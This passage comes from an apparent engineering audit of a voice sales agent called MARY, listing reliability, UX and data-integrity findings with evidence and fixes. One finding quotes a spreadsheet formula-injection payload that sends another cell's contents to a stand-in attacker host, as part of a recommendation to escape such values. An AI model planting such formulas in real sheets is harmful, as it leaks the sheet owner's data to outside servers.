findings.recommendation: Only flag lines of 6+ words, and check followUp against earlier followUps. Pass the nudge as a system note in buildPrompt, not as a Person line. Never end a turn without output: if the final line is suppressed, say a short rotating bridge line or show an inline 'MARY didn't answer — Retry' chip, and reset presence to idle in a finally block. Vary the fallback copy so the retry isn't itself a near-repeat. Retell Option B removes this runner for voice, but the typing path keeps /api/turn, so the fix has to carry over.

findings.title: One hung request freezes the call for good, and messages typed in the meantime vanish
findings.evidence: With /api/turn and the fallback both hanging, the screen shows 'MARY … / Thinking…' at 5, 14, 18, 30, 60 and 90 s (scratchpad/ux-audit/reliability/s03-turn-fn-hang-*.png). A message typed at 30 s never appeared on screen, and no request was ever sent (s03-turn-fn-hang.json). Causes: the fallback maryTurn has no timeout (mary-stream.ts:46-54; mary.functions.ts:595 streamText has no abortSignal), and ADD_LINE runs inside the serial queue (turn-runner.ts:65-71, 83-91). A transcription hang gives 45 s of 'Thinking…' (s04-transcribe-hang-45s.png): the client fetch has no signal (audio-engine.ts:2170) and the upstream has no timeout (routes/api/transcribe.ts:33-37).
findings.user_impact: A slow or stuck upstream silently kills the conversation. The visitor's own words disappear from the screen, which reads as the app ignoring them.
findings.recommendation: Put AbortSignal.timeout on every client fetch (fallback turn about 12 s, transcribe about 10 s) and on the server function's streamText and the transcribe upstream fetch. Dispatch ADD_LINE for the user's message synchronously in send(), before enqueue. Make a newer send() abort the in-flight turn instead of queuing behind it. On timeout, show a retry chip.

findings.title: A failed transcription blames the visitor, and any empty transcript leaves 'Thinking…' stuck
findings.evidence: /api/transcribe 502 comes back as '' (audio-engine.ts:2171), which shows 'Didn't catch that. Hold, speak close to the phone' (scratchpad/ux-audit/reliability/s02-error-line-2-hold1.png). With healthy services, a hold that transcribes to 'Thank you.' or 'Bye.' is dropped by the hallucination filter (audio-engine.ts:2158-2160,2174). The orb then still says 'MARY is thinking' and the button reads 'Thinking… hold to talk' 20 s later (s04-empty-transcript-2-plus20s.png). Cause: onRelease sets thinking (mary-app.tsx:192-195), but waiting() only resets presence from 'hearing' (mary-app.tsx:175-179).
findings.user_impact: Visitors are told to speak closer when the service is down. After a miss, the screen claims MARY is thinking when nothing is happening, so people wait instead of pressing again. Saying 'thank you' or 'bye' is ignored.
findings.recommendation: Return an error from transcribe() for non-2xx responses and timeouts, and show 'I couldn't process that just now — hold again or type'. In waiting(), reset presence to idle from both 'thinking' and 'hearing'. Don't apply the hallucination filter to held clips with a real peak and more than 600 ms of audio. Retell's managed speech-to-text removes this path for voice.

findings.title: Nobody is told when a lead or a callback request arrives
findings.evidence: The owner view reads only this browser's localStorage (src/components/waitlist-vault.tsx:57) plus the sheet's row count (:61-97). There is no notification code, and Code.gs only writes rows and an Activity log (Code.gs:233). The callback copy promises 'The team receives your request straight away' (text.ts:71). Retell's alerting watches only totals: 'It isn't built for reacting to a single call' (https://docs.retellai.com/features/alerting-overview).
findings.user_impact: A visitor who asked to be called back waits on a sheet nobody may open for days, even though speed-to-lead is the product's own pitch.
findings.recommendation: In Code.gs upsertLead, on the first change to 'Callback requested' or 'On the waitlist', email the owner with MailApp or post to a Slack incoming webhook with UrlFetchApp. Include name, phone/email, business, the summary and a link to the row. Add a daily digest of in-progress or abandoned rows that have contact details. With Retell, fire the alert from the same upsert (UX-25).

findings.title: Visitors with no business (students, job-seekers, the curious) can never join, contradicting the playbook
findings.evidence: The playbook says 'If they have no business at all… don't invent one, and still offer them the spot' (docs/mary-voice.md:221-222). The prompt says the opposite: 'If they have no business at all… switch to EXIT… set declined true' (src/lib/mary-prompt.server.ts:119), and business, industry and operations are required for complete (:90, :235; text.ts:55).
findings.user_impact: Every event has curious visitors and job-seekers. The model gets two opposite instructions, so what it does depends on the model, but the code path always ends as declined: a lost sign-up and a confusing goodbye.
findings.recommendation: Follow the playbook. With name+email, they get the spot (the same change as UX-03). Change mary-prompt.server.ts:119 to 'If they have no business at all, say that's fine, skip discovery and the reveal, and hold their spot with their email.' Port it into the Retell prompt.

findings.title: There is no way to end the call; closing the tab silently saves the partial transcript
findings.evidence: The call header holds only the talk-mode and voice toggles (src/features/mary/ui/call-stage.tsx:142-176), and the call-stage button list in scratchpad/ux-audit/funnel/log-voice-desktop.json has no end control. The reducer has no end action (conversation/reducer.ts:35-92): FINISH comes only from lead.finalize, when MARY decides the call is over (text.ts:51-59). On tab close or background, lead-lifecycle.ts flush sends a beacon with outcome 'abandoned', the transcript and any captured fields (mary-app.tsx:400-413). Competitors: ElevenLabs /agents puts a hang-up button in the orb (scratchpad/browser/during-agents-ios.png, 2026-09-23). Vapi's demo shows an end-call button next to a timer (scratchpad/ux-audit/market/shots/vapi-demo-10s-ios.png, 2026-09-26), and its widget's end-button-text defaults to 'End Call' (https://docs.vapi.ai/chat/web-widget). Retell SDK 3.0.1 README: 'await call.end(); // leaving is what ends a web call' (npm, 2026-09-08).
findings.user_impact: A visitor who is done, interrupted or unhappy can only close the tab. They never see the end screen or what was saved, never get the 'no pressure' exit, and their partial answers are stored without being told. For a voice product this feels like a trap, and after Retell an unclosed tab is a live, billed line.
findings.recommendation: Add an 'End' control (icon plus label, at least 44 px) in the CallStage header at every breakpoint. On press: stop speech, close the mic and call lead.finalize with the current state. If an email is already collected, go to the end screen ('Want me to save what you told me?'). Otherwise show the declined screen, which has 'Keep talking' (end-screen.tsx:104-122), plus a 'Want launch news anyway? [email]' field and 'Delete what I said'. With Retell, wire the same button to call.end() and let the call_ended webhook finalize the row.

findings.title: Grounding records business and industry values that the quoted words don't support ('dental' from 'a small practice')
findings.evidence: src/lib/mary-grounding.ts:328-336 only checks that the evidence quote occurs in the person's words, never that the value follows from it. Probe (scratchpad/ux-audit/conversation/probe-logic.out.json): userMessages ['I run a small practice.'], proposed industry 'dental', business 'Smile Dental Group' and operations 'front desk calls every lead back by hand', all with evidence 'I run a small practice'. All three were accepted; rejected was []. The vertical guard covers only real estate and finance words (mary-grounding.ts:129-154), while the playbook forbids guessing dental, auto, HVAC and staffing too (docs/mary-voice.md:217-218). No unit test covers this (tests/unit/grounding.test.ts).
findings.user_impact: The sheet and the reveal ('I've got your business…') can hold a business name and trade the person never said. That breaks the product's main promise, that she only records what was said, in front of the prospect.
findings.recommendation: In the default case, also require the value to be supported. For business, at least 50% of the value's content tokens must appear in the person's words. For industry, the head word or a mapped synonym must appear. Extend VERTICAL_VALUE to every vertical the playbook names, and add unit tests for these probe cases. For Retell Option B, add <field>_evidence params to save_lead and run groundCollected on the user lines of call.transcript, which every custom-function request includes (https://docs.retellai.com/build/single-multi-prompt/custom-function).

findings.title: Sideways replies count as 'yes' and confirm her guess, bypassing the real-estate guard
findings.evidence: AFFIRMATION_START includes 'you', 'basically', 'pretty', 'more', 'right' and 'sure' (src/lib/mary-grounding.ts:15-44), and isAffirmation only rejects on a negation word. Probe (scratchpad/ux-audit/conversation/probe-logic.out.json): 'You know, we mostly do cars', 'Basically we're a law firm', 'Pretty much the opposite, we do cars' and 'Right, we're a law firm' are all read as yes. After MARY's line 'Let me guess — real estate…?', the reply 'You know, we mostly do cars' records industry 'real estate', because the affirmation exception at :210 overrides assumesVertical.
findings.user_impact: She confidently records the vertical the person just corrected, then sells to it. This is exactly the default-to-real-estate failure the guard was written to stop.
findings.recommendation: Treat those words as a yes only when the reply is 3 tokens or fewer, or has no other content nouns; otherwise treat it as an answer. Add the probe sentences to tests/unit/grounding.test.ts. In Retell, run the same logic in the save_lead handler.

findings.title: The Retell migration can silently lose MARY's captions, live progress pills and the orb's 'hearing you' state
findings.evidence: Retell SDK 3.0.1 README (npm, 2026-09-08; scratchpad/ux-audit/market/retell-sdk-readme.md): '`transcript: true` also streams the transcript... it needs a key with `Call.Write`, which a public key scoped to web calls alone won't have, so it is off by default.' Retell web-call docs (https://docs.retellai.com/deploy/web-call, fetched 2026-09-26, scratchpad/retell/deploy_web-call.md): :158 onAudio snapshots contain incoming (agent) audio only, so there is no visitor level; :126 the transcript 'can change as a turn progresses and does not mark exact speaking boundaries'; :129 the transcript socket is optional and 'This failure does not fire onError'. SDK base-session.ts:290-297 allocates a new Float32Array(fftSize) and emits it on every animation frame. retell-migration.md:56 assumes 'the live transcript from SDK transcript events', and retell-shared.ts:23 already has a transcriptKey field. Option B gives the browser no structured fields mid-call (retell-migration.md step 5: fields arrive only via save_lead), though retell-shared.ts:28,102-117 plans note_details and /api/retell/call-status returning CallProgress.collected. What depends on this today: the word-by-word caption (call-stage.tsx:15-29, 237-243), 'Show conversation' (:259-268), the screen-reader live region (:182), the 'The words are on screen' fallback (composer.tsx:339-341), and the pills showing the email as it is captured (progress-pills.tsx; scratchpad/ux-audit/funnel/shots/convo-ios-15-progress-pills.png; the email is truncated at max-w-32, progress-pills.tsx:333). Market: ElevenLabs made widget transcripts on by default on 2026-08-24 (https://elevenlabs.io/docs/changelog/2026/8/24), Vapi's show-transcript defaults to true, and no competitor widget shows live captured fields.
findings.user_impact: If the Retell build ships with a public key scoped to web calls and the current UI is simply rewired, the screen shows an orb and nothing to read. Deaf and hard-of-hearing visitors, people in loud rooms and iPhones with failed audio lose what saves those calls today. Captions can freeze silently. The pills stay empty until the end, so a misheard email goes unnoticed. The orb has no input for its 'hearing you' state.
findings.recommendation: Make captions and live pills explicit acceptance criteria for Retell build slice 1. Captions: use either a second, narrowly scoped key for the transcript stream (the planned transcriptKey, checked against Retell's key scopes) or a server-side relay of transcript updates through /api/retell/call-status; never put a broad Call.Write key in the page. Render streamed chunks with a short fade per chunk. Keep the karaoke reveal only where Retell gives timing; otherwise reveal a whole utterance on agent_stop_talking. Show a 'captions unavailable' state when the socket drops. Orb: map status connecting -> 'Connecting', agent_start/stop_talking -> speaking, and a local mic analyser -> hearing. Compute the level inside the orb's own frame at 30 Hz or less rather than subscribing to every 'audio' event. Pills: have MARY call note_details as each field is confirmed and update the pills from call-status polling. Make the email pill tappable so a typed correction is sent via /api/retell/inject (README: update({ call_control: { additional_context, trigger_response: true } })). Remove the max-w-32 truncation for the email.

findings.title: Retell path: save_lead and the webhook need a durability guarantee before go-live
findings.evidence: Retell webhooks time out after 10 s and are retried up to 3 times, then dropped. Retell's docs say to return 2xx only 'as soon as you have safely accepted the payload' (https://docs.retellai.com/features/webhook-overview). The plan's webhook gives the sheet 7 s and returns 502 on failure (scratchpad/retell/plan.md:536-538). When no sheet is configured it returns 204 and writes nothing. Dedupe is per isolate (plan.md:1131). save_lead writes the sheet only at final or callback (plan.md:526). Retell keeps call history indefinitely by default (https://docs.retellai.com/accounts/data-retention), and its list-calls API accepts filter_criteria (https://docs.retellai.com/api-references/list-calls).
findings.user_impact: If the sheet is down for longer than Retell's retry window, or isn't configured, voice leads exist only in Retell's dashboard and nobody notices.
findings.recommendation: Make these go-live gates. (1) Refuse VOICE_PROVIDER=retell unless /api/lead reports configured and reachable. (2) Upsert keyed by sessionId, falling back to retell_<call_id>, so save_lead, call_ended, call_analyzed and retries all land on one row. (3) Add a reconciliation job (a scheduled task or a retell/reconcile.ts script) that lists the agent's calls since the last run and upserts any missing from the sheet. (4) Set Retell data retention to at least 30 days so Retell is the durable backup (and reconcile this with the privacy retention choice in UX-12). (5) Fire the owner alert (UX-19) and the confirmation email (UX-10) from that same upsert. (6) Drive the end screen from the save_lead result (UX-02).

findings.title: The iPhone 'Can't hear her?' row shows from second 0 for three answers: it squeezes out her question, makes the hold button jump 52 px when it goes, and its buttons are 19-21 px tall
findings.evidence: While the screen still shows '…' (Thinking), the row 'Can't hear her? Turn the volume up and tap Play sound. [Play sound] I can hear her' is already visible (scratchpad/ux-audit/funnel/shots/voice-ios-06-after-tap-1250ms.png; visual/shots/390x844-light-2-call-thinking.png). It stays while answers < 3 (mary-app.tsx:354-370 on live/HEAD, 389-409 at 5f531ad; composer.tsx:320-338). It measures 358x46 at y=606 during her first line. On the branch, tapping 'I can hear her' grows the caption from 117 to 168 px and makes the question visible (mobile/shots/dismiss-local-after-welcome.png vs dismiss-local-after-dismiss.png, run-dismiss.txt). When the row disappears, a layout-shift entry records the orb canvas 117→143, the composer 201→149 and the hold button top 454→506 (visual/run-375x667-light.json, t=24024, value 0.051), and 631→683 at 390x844. That contradicts composer.tsx:205-206 ('the button never moves under a thumb'), because the hint renders below the textarea (composer.tsx:320). 'Play sound' is 76x21 and 'I can hear her' 91x21 (live: 70x19 and 83x19). The row also shows in 'Type instead' mode. Audio is now confirmed on a real iPhone 13 (PROJECT-STATE.md:67). In Retell mode 'answers' never increases when transcript is off (retell-loader.ts sets transcript: Boolean(transcriptKey)), so the row would stay up for the whole call. Apple HIG asks for at least 44x44 pt targets (https://developer.apple.com/design/human-interface-guidelines/buttons).
findings.user_impact: The first thing an iPhone visitor sees, while MARY is audibly talking, is a hint that the product might be broken. It squeezes the name, business and email questions, the most important stretch of the funnel. Just after the third answer, the button under their thumb moves 52 px, which invites mis-taps. The 19-21 px buttons are easy to miss one-handed.
findings.recommendation: Show the row only after her first line has finished playing and the visitor hasn't pressed Hold or typed within about 2-6 s, or collapse it to a single 44 px 'Sound' chip in the header. Retire it after the first answer instead of the third, and base the rule on time and presence rather than the line count. Reserve a fixed-height slot for all notices (min-h on the notice container, or absolute positioning above the hold button with a fade) so nothing moves. Give both buttons min-h-11 px-4. With Retell, wire the chip to the SDK's startAudioPlayback() inside the tap (https://docs.retellai.com/deploy/web-call) and show it only when audio is actually blocked.

findings.title: 'Type instead' opens a voice call: MARY speaks aloud, Hold stays the main control, and the copy says to hold
findings.evidence: In the typeinstead-ios run, MARY's greeting plays with sound: voiceOff stays false, because start(false) only sets listening to 'paused' (mary-app.tsx:532). The Hold button and the 'Hold the button while you talk' status stay primary (composer.tsx:178,203). 'Can't hear her? … Play sound' shows, and the text box is labelled 'Or type your answer' (scratchpad/ux-audit/funnel/shots/typeinstead-ios-10-your-turn.png). On phones the input is not focused, because focusComposer runs only when hasFinePointer (mary-app.tsx:488-492).
findings.user_impact: People who chose typing because they are in a quiet or public place get a talking bot and a voice UI. They have to find the voice toggle and tap the text box before they can answer.
findings.recommendation: Make 'Type instead' a real chat mode: start with voiceOff true (keep the toggle), hide HoldButton in typing mode (!voiceWanted) and while the textarea has focus (show a 44px mic icon instead), render the running transcript as chat bubbles, and focus the input after her first line. With Retell this path stays on /api/turn (docs/architecture/retell-migration.md:29,83), so it must be kept and polished separately.

findings.title: Tapping Start twice while the mic prompt is open opens two mics and runs two welcomes, so MARY asks the name twice (3 AI calls instead of 1)
findings.evidence: Desktop runs (funnel double-tap.mjs: prompt answered after 4 s, second click at +1.6 s; reliability s04-double-tap-desk.json) show 2 getUserMedia calls and 2 live mic streams. /api/turn welcome ran twice, plus a /_serverFn maryTurn repeat-retry, which is a paid LLM call on the live site. The transcript reads 'Hello. I am MARY. / What should I call you? / What should I call you?', with the second greeting about 4.4 s after the first (scratchpad/ux-audit/funnel/shots/doubletap-desktop-result.png). While waiting, the landing shows no pending state (doubletap-desktop-waiting-for-permission.png). Cause: start() checks stage === 'landing' (mary-app.tsx:508-510), but the stage is set only at :531, after `await unlockAudio(); await primed`. The button has no disabled or loading state (landing.tsx:146-157). primeMicPermission overwrites primedStream (audio-engine.ts:1305-1307), so the first stream is left with nothing that can stop it. Not reproduced on the iPhone profile.
findings.user_impact: Chrome's mic bubble is small and easy to miss, so a second click is likely. The visitor gets a doubled, confusing greeting and possibly a mic indicator that stays on, and the operator pays twice. With Retell it would open two billed calls with two MARYs talking.
findings.recommendation: Set a 'starting' ref or store flag synchronously at the top of start(). Disable both landing CTAs and show 'Allow the microphone to talk to MARY…' next to the button while permission is pending. Make primeMicPermission share one in-flight promise instead of calling getUserMedia again. With Retell, the same guard must stop a second POST /api/retell/web-call.

findings.title: Silence is never handled: no nudge after a statement, no timeout when the visitor walks away, and Retell's defaults are wrong for a two-minute call
findings.evidence: The playbook's 'Silence — "Still with me? No rush."' (docs/mary-voice.md:403) never reaches the model, because /api/turn runs only on user input (turn-runner.ts:57-72). The client nudges only when the mic is muted or unavailable (mary-app.tsx:378-398: `if (stage !== "call" || (micLive && !micMuted)) return`; 22 s, 3 lines in text.ts:137-141). The reveal turn ends on a statement (live call 4 followUp '…without a form—that's Convert.'). 90 s after the welcome in hold mode there is no nudge, no timeout and 1 live mic stream (scratchpad/ux-audit/reliability/s04-silence-0.png vs s04-silence-90s.png), and PR #2's wake lock is held for the whole call (mary-app.tsx:274-286). Retell defaults: reminder_trigger_ms 10000, reminder_max_count 1, end_call_after_silence_ms 600000 and max_call_duration_ms 3600000 (https://docs.retellai.com/api-references/create-agent). The repo's retell/agent.json already sets end_call_after_silence_ms 45000 (mobile lens; see UX-58). Cost: voice infra $0.055 + TTS $0.015 + GPT 5.6 Terra $0.064 + denoise $0.005 ≈ $0.139/min (https://www.retellai.com/pricing). An abandoned tab on the 10-minute default costs about $1.39, versus about $0.35 for a real 2.5-minute sign-up.
findings.user_impact: After a statement like the reveal, nothing tells the visitor it's their turn, so there is dead air until they guess or leave. A visitor who walks away leaves a phone awake with the mic indicator on, and no partial lead is written if they gave no field. Under Retell with default settings, an abandoned line stays open and billed for up to 10 minutes and never closes cleanly into the end screen.
findings.recommendation: Now: let the idle timer also fire with a live mic. After about 20-45 s with no press, speak one gentle nudge that restates the last question more simply. After about 3 min, show 'Still there? Continue / Leave your email', release the mic and wake lock, and flush the lead as abandoned. If name+email are already captured, close as signed_up. In Retell: reminder_trigger_ms about 8000 and reminder_max_count 2, with the IDLE_NUDGES wording (first a simpler restatement, then 'I'll hold your spot if you give me an email, or type it below'). Set end_call_after_silence_ms to about 45000-60000 (weigh this against app-switching in UX-58) and max_call_duration_ms to about 480000. An onEnd with a silence disconnection_reason should land on the end screen with the partial save, not an error.

findings.title: A reload restarts the pitch, the next person on a shared device inherits the previous visitor's details, and both cases overwrite the sheet's transcript
findings.evidence: Reload after 2 answers (scratchpad/ux-audit/reliability/s04-reload-3-restarted.png, s04-reload.json): the visitor is back on the landing with no 'continue' and gets a fresh welcome with messages=[], while the pills already show name and email (only the collected fields are restored, mary-app.tsx:467-474). The next checkpoint sends turns:0 and a short transcript, which Code.gs:210/216 writes over the full transcript. Shared device (leads/kiosk.json, kiosk-visitor2-call.png): visitor 1 gave a name and business and walked off. After a reload, visitor 2 ('Hi, I am Jordan') started with the pills showing 'Sam Rivera · Rivera Homes · Real estate'. The turn request carried visitor 1's fields, and visitor 2's lead POST reused sessionId w_muhtl1aw_0v9hdi with a new 128-character transcript. Progress is restored for the sessionStorage id (waitlist-store.ts:98-109).
findings.user_impact: An accidental pull-to-refresh or iOS tab reload restarts the pitch, and the operator loses the earlier transcript. On a booth or demo tablet, visitor 1's name ends up on visitor 2's conversation, and every earlier visitor's personal data stays readable in that device's owner view with no expiry.
findings.recommendation: Persist lines and flags in sessionStorage per sessionId. Only if the entry was updated in the last ~10 minutes, offer 'Pick up where you left off? / Continue as Sam?' before reusing it; otherwise start fresh. In Code.gs, append transcript parts (or keep the longer one) instead of overwriting. Add ?kiosk=1, which clears local entries after each finish and after an idle timeout.

findings.title: Anyone can write rows into the sheet, including spreadsheet formulas
findings.evidence: The guard lets requests with no Origin through, by design, for beacons (src/lib/api-guard.ts:44-49). /api/lead accepted the name '=HYPERLINK("https://evil.example/?"&C2,"click")' (scratchpad/ux-audit/leads/schema-probe.out.json). The repo's Code.gs writes cells with setValues and appendRow (Code.gs:227-229), and Apps Script's docs say that for setValues, 'If a value begins with =, it's interpreted as a formula' (https://developers.google.com/apps-script/reference/spreadsheet/range, updated 2026-08-19). SHARED_SECRET defaults to an empty string (Code.gs:27).
findings.user_impact: Once the sheet is connected (UX-01), a script can flood it with fake sign-ups, each taking a real position. It can also plant formulas that run in the owner's account when they open the sheet and send other rows to an outside server.
findings.recommendation: Before connecting the sheet: in setIf, prefix any value starting with = + - @ with an apostrophe. Require a non-empty secret. Accept only sessionIds in this site's w_ format and issue a per-session token at Start (decision D4). Rate-limit per session.

findings.title: Visitors whose browser blocks storage all share one sheet row named 'session'
findings.evidence: sessionId() returns the literal 'session' when storage throws (src/lib/waitlist-store.ts:99,107). Two mocked visitors with blocked storage (Ana and Ben) both posted sessionId 'session' (scratchpad/ux-audit/leads/blocked-storage.json). Code.gs upserts by session (Code.gs:173), so the last one to write wins.
findings.user_impact: Each such visitor overwrites the previous one's details. This happens with Chrome's 'block all cookies' setting and in some embedded or in-app browsers.
findings.recommendation: Fall back to an in-memory crypto.randomUUID() per page load instead of a constant.

findings.title: The same person gets several rows and several positions
findings.evidence: 'Start another conversation' calls newSession() (mary-app.tsx:591-595). A mocked repeat sign-up with the same email created sessions w_muhtlv7k_9ipkvx and w_muhtmdwe_i92y27, shown as positions #690 and #250 (scratchpad/ux-audit/leads/again.json, again-second-end.png). Code.gs deduplicates by session only (Code.gs:173) and hands out a new position for every row (Code.gs:220-224).
findings.user_impact: Counts and positions inflate, the team may contact the same person twice, and the visitor sees a different number each time.
findings.recommendation: In Code.gs, normalise the email. When a signed_up or callback row arrives with an email that already holds a position, reuse that position and record the extra session id. Make the end screen's 'Fix a detail' flow (UX-11) the way to correct details, instead of starting over.

findings.title: One over-long field makes the server reject the whole lead
findings.evidence: The local /api/lead returned 400 for operations of 401 characters, business of 201, name of 121 and a transcript of 60,001 (scratchpad/ux-audit/leads/schema-probe.out.json; lead-sync.ts:20-27; lead.ts:48-51). Turn input allows 600 characters per field (mary.functions.ts:96), and the model's operations output has no limit (mary-prompt.server.ts:33). Every checkpoint, the final save and the beacon repeat the same field, so they all fail. This is unlikely in practice: the one live sample of operations was 70 characters (ux-audit/conversation logs).
findings.user_impact: A talkative visitor's entire lead is silently dropped, and the client doesn't log the 400.
findings.recommendation: Truncate instead of rejecting in LeadPayloadSchema (.transform(v => v.slice(0, cap)), as src/lib/retell-shared.ts:66 already does), and log a warning on the server.

findings.title: No product telemetry: outages and funnel drop-off are invisible
findings.evidence: Only the root error boundary reports (__root.tsx:37-42, lovable-error-reporting.ts). The window.__lovableEvents.track type exists but is never called, and error-capture.ts is server-only. Turn fallbacks, SNAG lines, speech onError, transcribe non-2xx and lead sync 'failed' are never reported. The only analytics is Lovable's flock.js page_hit (live HTML <script defer src='/~flock.js' data-proxy-url='/~api/analytics'>, saved at scratchpad/ux-audit/leads/flock.js). flock.js exposes window.Tinybird.trackEvent(action, payload), which masks email and phone keys. A grep for analytics|gtag|posthog in src/ finds nothing. A session with zero answers never creates a row (lead-lifecycle.ts:148 `turns < 1`), checkpoints fire only when a field changes (:79-94), and mic denials and transcription failures are never recorded. The 2026-09-23 outage was found by manual probing (.claude/POSITION.md:81).
findings.user_impact: The operator can't see visitors hitting broken calls, so an outage can run for hours, as it did on 2026-09-23. They also can't tell how many people tapped Start, granted the mic, answered once, gave an email or finished, so they can't tell whether audio, the opening or the email ask is losing people.
findings.recommendation: Send about 8 funnel events: landing_view, start_voice or start_typed, mic_granted or mic_denied (with the reason), first_answer, field_captured, email_captured, wrap, outcome. Also send failure events: turn_fallback, speech_failed, transcribe_failed, lead_sync_failed. Use window.Tinybird?.trackEvent / __lovableEvents.track, or a small /api/event beacon that writes to Cloudflare Analytics Engine. Send an in_progress row at Start and add a 'Furthest step' column to the sheet. Add an hourly synthetic check of /api/turn and /api/speech with alerting. With Retell, feed the same events from SDK callbacks and webhooks.

findings.title: Screen wake lock: missing from the live build, silent when refused, and not provided by the Retell SDK
findings.evidence: The live bundle https://omnisuite.omnikom.io/assets/routes-DZfdjxLS.js contains no 'wakeLock' (grep, 2026-09-26). PR #2 adds it at mary-app.tsx:51-75 (62-82 at 5f531ad), but its rejection handler is `() => {}`, so nothing is recorded. WebKit WakeLock.cpp:74-83 grants the first lock only with transient activation and allows re-requests after that, which matches the PR's comment. Requests were seen at the tap and again on return to visible (6742, 6879 and 15022 ms); headless Chromium denies, so a grant was not observed. retell-client-js-sdk 3.0.1 (npm, 2026-09-08) has no wakeLock or visibilitychange handling in src (scratchpad/retell/client/package/src). Apple says Low Power Mode sets Auto-Lock to 30 seconds (https://support.apple.com/en-us/101604), and MDN says wake lock requests may be rejected in power-save mode (https://developer.mozilla.org/en-US/docs/Web/API/Screen_Wake_Lock_API). browser-compat-data: Safari iOS 18.4+ has full support; 16.4-18.3 is broken in Home Screen apps. Hands-free mode has no touches to reset the auto-lock timer.
findings.user_impact: On the live site, and wherever the lock is refused (older iOS, some webviews, Low Power Mode), an iPhone that auto-locks mid-call suspends her voice and the mic. A hands-free visitor in Low Power Mode loses the call after 30 s.
findings.recommendation: Merge and publish PR #2, after UX-14. Record the wake-lock result with trace({type:'wakeLock', ok}) and add it to audioDiagnostics (audio-engine.ts around line 603). If it is denied in hands-free mode, show a one-time 'Keep the screen on' hint, or stay in hold mode. Keep holdScreenAwake around the Retell call: request it in the Start tap and re-acquire it on visibilitychange.

findings.title: In-app browser detection misses TikTok and Android WebViews, and nothing warns the visitor before they tap Start
findings.evidence: audio-engine.ts:1263-1268: the regex matches 'TikTok', but TikTok in-app user agents carry musical_ly_, trill_ or BytedanceWebview, and generic Android WebViews carry '; wv)' (https://useragent.in/in-app-browser-user-agents). landing.tsx has no in-app branch, so 'Start talking' is always the main button. According to https://plugwith.me/blog/what-escapes-instagram-in-app-browser-in-2026/ (2026-08-17, updated 2026-09-24), x-safari-https stopped being reliable in Meta webviews around mid-2025, while instagram://extbrowser via meta refresh still worked.
findings.user_impact: Visitors from TikTok or an Android WebView get the generic 'Safari, Chrome or Edge' copy. Visitors from every social app hit a dead mic before learning how to get out of the in-app browser.
findings.recommendation: Extend isInAppBrowser to match musical_ly|trill_|BytedanceWebview|; wv\) and return the app name. In landing.tsx, when in-app, show one line above the buttons ('Opened inside Instagram? For voice, open in Safari: ⋯ → Open in external browser') plus a Copy link button, and make 'Type instead' an equal first choice. Try an instagram://extbrowser meta-refresh link on Instagram and an intent://…;package=com.android.chrome link on Android, and log whether they work (UX-35).

findings.title: In hold mode nothing notices the mic being muted or taken (AirPods switch, incoming call, Siri), and MARY then blames the visitor's voice
findings.evidence: hold-recorder.ts adds no listeners to the track and none for devicechange. A census in a running call found trackEvents [] and devicechange 0 (scratchpad/ux-audit/mobile/run-mute.txt). The hands-free path does listen (audio-engine.ts:2016-2031). After a faked 'mute', the UI kept showing 'Hold to talk' and diagnostics read micTrack 'live (muted)'. A muted track records silence, which hits SILENT_PEAK (hold-talk.ts:127) and then onMissed (mary-app.tsx:214). The visitor sees 'Didn't catch that. Hold, speak close to the phone' (composer.tsx:208), then 'Loud in here? Type your answer' (composer.tsx:211). An ended track recovers on the next press (run-ended.txt: 2 getUserMedia calls, 2 track stops). iOS keeps the track live all call (hold-recorder.ts:9-13). AirPods are listed as unproven (.claude/POSITION.md:122).
findings.user_impact: After a phone call, Siri, or putting in or taking out AirPods, the visitor's next answers vanish. MARY tells them to speak closer or blames the room, and after two tries pushes them to typing.
findings.recommendation: In HoldRecorder.openLine (around hold-recorder.ts:148), listen for mute, unmute and ended on the track and for navigator.mediaDevices devicechange, and expose onLost(reason). Wire it through the hold deps in mary-app.tsx to SET_MIC {error: micLostMessage(reason)}. In HoldTalk.press, if the track is muted, stop it and reopen with getUserMedia inside the press gesture before calling start(). In HoldTalk.finish, treat peak === 0 exactly (a dead mic) differently from quiet speech: reopen and say 'the microphone went quiet, hold again'. Retell (LiveKit) handles mic interruption itself.

findings.title: Going offline mid-call is reported as a server snag and a broken microphone, and the error stays after recovery
findings.evidence: Offline, a typed message gets 'I hit a snag on my side — could you try that once more?'. Offline, a hold makes the transcribe fetch throw: hold-talk.ts:505-509 calls onError, and mary-app.tsx:206-209 shows 'I couldn't open the microphone…' and sets mic.live=false, which also starts idle nudges. Back online with a normal answer, the mic error is still on screen (scratchpad/ux-audit/reliability/s04-offline-2-held-offline.png, s04-offline-3-back-online.png). There is no navigator.onLine or online/offline handling anywhere in src/features/mary.
findings.user_impact: On conference Wi-Fi, the visitor is misled about what broke (their mic, or MARY) and may give up, even though retrying would have worked.
findings.recommendation: Listen for offline and online events and show 'You're offline — I'll carry on when you're back'. Queue the typed message and send it automatically on 'online'. Route network errors away from micMessage, and clear mic.error after the next successful hold.

findings.title: When the speech service hangs, every line sits dim for about 9 s, and during outages the screen gives conflicting 'can't hear her' advice
findings.evidence: With /api/speech hung, the line stays at 20% opacity as 'MARY is speaking' until the 9 s first-byte guard fires (audio-engine.ts:1076-1078), then again for the follow-up (scratchpad/ux-audit/reliability/s03-speech-hang-3s/6s/9.5s/12s.png). That is about 19 s per two-beat turn, with a fresh request for each line. During a 502, 'Can't hear her? Turn the volume up and tap Play sound' shows next to 'My voice didn't come through just now' (s02-error-line-1-welcome.png). Play sound re-requests /api/speech (audio-engine.ts:660-669).
findings.user_impact: Slow speech turns every turn into a long wait. In an outage, the visitor is sent to fiddle with their volume, and each tap on Play sound is another failing paid request.
findings.recommendation: Add a circuit breaker: after one speech failure, reveal text at once and switch to voice-off for 60 s with a 'Voice unavailable — reading mode' note. Lower the first-byte guard to about 4 s. Hide silentHint while voiceFailed is shown.

findings.title: One 'not now' ends the funnel with no lighter option to capture
findings.evidence: The prompt says 'if they want off the call, let them go warmly and set declined true' (src/lib/mary-prompt.server.ts:156, and :119 EXIT). The declined screen offers only 'Keep talking to MARY' or 'Start over' (end-screen.tsx:107-131; scratchpad/ux-audit/funnel/shots/declined-ios-21-end-settled.png). The mocked decline posted a row with every field empty (log-declined-ios.json).
findings.user_impact: Visitors who are curious but short on time leave with nothing captured, even though an email-only sign-up is the cheapest conversion.
findings.recommendation: On the declined screen, add one field: 'Just want launch news? Leave your email' -> /api/lead with outcome 'updates_only'. In the prompt and the Retell port, offer this once before EXIT.

findings.title: A rushed visitor still gets the full pitch, and a cut-in during the lanes pitch replays it
